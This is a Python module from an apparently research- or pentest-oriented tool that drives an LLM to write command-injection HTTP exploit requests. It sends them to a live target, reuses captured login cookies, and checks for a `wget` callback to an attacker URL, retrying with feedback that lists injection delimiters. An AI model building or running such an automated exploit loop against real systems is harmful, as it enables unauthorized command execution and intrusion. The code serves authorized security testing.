from __future__ import annotations
from typing import Dict, List, Optional, Type

from rich.console import Console

from PoCGen.config.config import SETTINGS
from PoCGen.llm.client import ChatMessage, LLMClient
from PoCGen.prompts.templates import build_prompt_command_injection_http
from PoCGen.core.sampler import sample_target_with_playwright
from PoCGen.core.target_profile import TargetSample
from PoCGen.core.attacker_monitor import AttackerMonitor
from PoCGen.core.remote_validator import validate_http_requests
from .models import (
    AttemptResult,
    GenerationResult,
    HTTPMessage,
    ValidationResult,
    VulnHandler,
)
from .postprocess import save_messages, split_messages
from .validators import parse_and_validate

console = Console()


class CommandInjectionHTTPHandler(VulnHandler):
    name = "command_injection_http"

    def build_messages(
        self,
        description: str,
        code_texts: List[str],
        target: Optional[str],
        attacker_url: str,
        target_profile: Optional[str] = None,
        validation_feedback: Optional[str] = None,
    ) -> List[dict]:
        msgs = build_prompt_command_injection_http(
            description=description,
            code_files=code_texts,
            target=target,
            attacker_url=attacker_url,
            target_profile=target_profile,
            validation_feedback=validation_feedback,
        )
        return [m.model_dump() for m in msgs]


HANDLERS: Dict[str, Type[VulnHandler]] = {
    CommandInjectionHTTPHandler.name: CommandInjectionHTTPHandler,
}


def get_handler(vuln_type: Optional[str] = None) -> VulnHandler:
    key = vuln_type or SETTINGS.default_vuln_type
    cls = HANDLERS.get(key)
    if not cls:
        raise ValueError(f"Unsupported vuln type: {key}")
    return cls()


def generate_poc(
    description: str,
    code_texts: List[str],
    target: Optional[str] = None,
    vuln_type: Optional[str] = None,
    temperature: float = 0.2,
    max_tokens: int = 4000,
    attacker_url: Optional[str] = None,
    probe_target: bool = False,
    auto_validate: bool = False,
    max_iterations: Optional[int] = None,
    stop_on_success: Optional[bool] = None,
    monitor_timeout: Optional[float] = None,
    login_url: Optional[str] = None,
    login_username: Optional[str] = None,
    login_password: Optional[str] = None,
    login_user_field: str = "username",
    login_pass_field: str = "password",
    use_browser_login: bool = False,
    browser_headless: Optional[bool] = None,
) -> GenerationResult:
    handler = get_handler(vuln_type)
    atk_url = attacker_url or SETTINGS.attacker_url

    max_iters = max(1, max_iterations or SETTINGS.max_iterations)
    if not auto_validate:
        max_iters = 1
    stop_after_success = SETTINGS.stop_on_success if stop_on_success is None else stop_on_success
    monitor_wait = monitor_timeout or SETTINGS.monitor_timeout
    out_dir = SETTINGS.save_dir
    attempts: List[AttemptResult] = []
    feedback_text: Optional[str] = None
    overall_success = False
    last_raw_output = ""
    last_requests: List[HTTPMessage] = []
    last_saved_paths: List[str] = []
    last_validation_results: Optional[List[ValidationResult]] = None

    monitor: Optional[AttackerMonitor] = None
    monitor_running = False
    if auto_validate and atk_url:
        monitor = AttackerMonitor(atk_url, timeout=monitor_wait)
        monitor.start()
        monitor_running = monitor.is_running()
        if not monitor_running:
            console.print("[yellow]Warning: attacker monitor failed to start; success detection will be disabled for this run")

    try:
        target_profile_block: Optional[str] = None
        target_sample_data: Optional[TargetSample] = None
        sample_cookies_header: Optional[str] = None
        if probe_target and target:
            if use_browser_login:
                try:
                    sample = sample_target_with_playwright(
                        target,
                        login_url=login_url,
                        login_username=login_username,
                        login_password=login_password,
                        login_user_field=login_user_field,
                        login_pass_field=login_pass_field,
                        headless=browser_headless,
                    )
                    target_sample_data = sample
                    target_profile_block = sample.as_prompt_block()
                    sample_cookies_header = sample.cookies_header
                except Exception as exc:
                    console.print(f"[yellow]Warning: failed to probe target {target}: {exc}")
            else:
                console.print("[yellow]probe_target currently requires --browser-login; skipping target sampling")

        for attempt_index in range(max_iters):
            console.print(f"\n[bold]Attempt {attempt_index + 1}/{max_iters}[/bold]")

            messages = handler.build_messages(
                description,
                code_texts,
                target,
                atk_url,
                target_profile_block,
                feedback_text,
            )

            client = LLMClient()
            try:
                cm = [ChatMessage(**m) for m in messages]
                raw_output = client.chat(cm, temperature=temperature, max_tokens=max_tokens)
            finally:
                client.close()

            raw_messages = split_messages(raw_output)
            if not raw_messages and raw_output.strip():
                raw_messages = [raw_output.strip()]

            if raw_messages:
                saved_paths = save_messages(raw_messages, out_dir)
                console.print(
                    f"Saved {len(saved_paths)} PoC request(s) to: {out_dir}"
                )
            else:
                saved_paths = []
                console.print(
                    f"[yellow]Attempt {attempt_index + 1} produced no parseable HTTP request"
                )

            requests: List[HTTPMessage] = []
            parse_issues: List[str] = []
            for idx, raw in enumerate(raw_messages):
                try:
                    msg, errs = parse_and_validate(raw)
                    requests.append(msg)
                    if errs:
                        for err in errs:
                            parse_issues.append(f"Request #{idx}: {err}")
                except Exception as exc:
                    parse_issues.append(f"Request #{idx} parse error: {exc}")
                    requests.append(HTTPMessage(method="", path="", version="", headers={}, body=raw))

            validation_results: Optional[List[ValidationResult]] = None
            if auto_validate and target and requests:
                # If sampler captured cookies, inject them into requests lacking Cookie header to improve validation fidelity.
                if sample_cookies_header:
                    for req in requests:
                        if "Cookie" not in req.headers:
                            req.headers["Cookie"] = sample_cookies_header
                try:
                    validation_results = validate_http_requests(requests, target)
                    for res in validation_results:
                        if res.success:
                            console.print(
                                f"[green]Request #{res.request_index} -> HTTP {res.status_code} ({res.url})"
                            )
                        else:
                            detail = res.error or (f"HTTP {res.status_code}" if res.status_code else "no response")
                            console.print(
                                f"[yellow]Request #{res.request_index} validation failed ({detail})"
                            )
                except Exception as exc:
                    console.print(f"[yellow]Warning: validation failed: {exc}")
                    validation_results = None

            monitor_hit = False
            monitor_summary: Optional[str] = None
            if monitor_running and requests:
                monitor_hit = monitor.wait_for_hit(monitor_wait)
                monitor_summary = monitor.last_request_summary
                if monitor_hit:
                    console.print("[bold green]Attacker monitor recorded a callback![/bold green]")
                    if monitor_summary:
                        console.print(monitor_summary)
                else:
                    console.print(
                        f"[yellow]No callback received on attacker monitor within {monitor_wait} seconds"
                    )

            feedback_for_next = None
            if not monitor_hit:
                feedback_for_next = _build_attempt_feedback(
                    parse_issues,
                    validation_results,
                    atk_url,
                    monitor_running,
                )

            attempts.append(
                AttemptResult(
                    attempt_index=attempt_index,
                    raw_output=raw_output,
                    requests=requests,
                    saved_paths=saved_paths,
                    validation_results=validation_results,
                    monitor_hit=monitor_hit,
                    monitor_summary=monitor_summary,
                    feedback=feedback_for_next,
                )
            )

            last_raw_output = raw_output
            last_requests = requests
            last_saved_paths = saved_paths
            last_validation_results = validation_results
            overall_success = overall_success or monitor_hit
            feedback_text = feedback_for_next

            if monitor_hit and stop_after_success:
                console.print("[bold green]Success criteria met; stopping further attempts[/bold green]")
                break

            if attempt_index + 1 < max_iters:
                if feedback_text:
                    console.print("[cyan]Prepared feedback for next attempt:[/cyan]\n" + feedback_text)
                elif not monitor_hit:
                    console.print("[yellow]No specific feedback generated; will request model to adjust strategy")

        return GenerationResult(
            raw_output=last_raw_output,
            requests=last_requests,
            saved_paths=last_saved_paths,
            validation_results=last_validation_results,
            attempts=attempts,
            success=overall_success,
        )
    finally:
        if monitor:
            monitor.stop()
def _build_attempt_feedback(
    parse_issues: List[str],
    validation_results: Optional[List[ValidationResult]],
    attacker_url: str,
    monitor_active: bool,
) -> Optional[str]:
    messages: List[str] = []
    if parse_issues:
        bullet = "\n".join(f"- {issue}" for issue in parse_issues)
        messages.append("Local HTTP parsing/validation issues detected:\n" + bullet)

    failed_validation: List[ValidationResult] = []
    if validation_results:
        failed: List[str] = []
        for res in validation_results:
            if res.success:
                continue
            failed_validation.append(res)
            reason = res.error
            if not reason and res.status_code is not None:
                reason = f"Target returned HTTP {res.status_code}"
            if not reason:
                reason = "Request failed without status code"
            preview = (res.response_preview or "").strip()
            if preview:
                preview = preview[:200]
                if len(res.response_preview) > 200:
                    preview += "..."
                reason += f". Response excerpt: {preview}"
            failed.append(f"Request #{res.request_index}: {reason}")
        if failed:
            messages.append("Target validation reported issues:\n" + "\n".join(f"- {item}" for item in failed))

    if monitor_active:
        messages.append(
            "Attacker monitor did NOT receive the expected wget callback. Ensure the payload executes `wget "
            f"{attacker_url}` directly (no URL encoding of separators) and that the vulnerable parameter maps to command execution."
        )
    else:
        messages.append(
            "Attacker monitor is unavailable, so success could not be confirmed automatically. Still refine the payload to trigger `wget "
            f"{attacker_url}` if possible."
        )

    if parse_issues or failed_validation:
        messages.append(
            "Priority adjustment: rework the request BODY before tweaking headers. Mirror the handler's expected "
            "form fields, parameter casing/order, and payload syntax so the vulnerable branch is actually reached. "
            "Ensure the body encoding (JSON vs form-urlencoded vs raw text) matches the backend, and reuse the "
            "injection delimiters it understands (e.g., '$(...)', '$(+ ...)', backticks, pipes)."
        )

    return "\n\n".join(messages) if messages else None

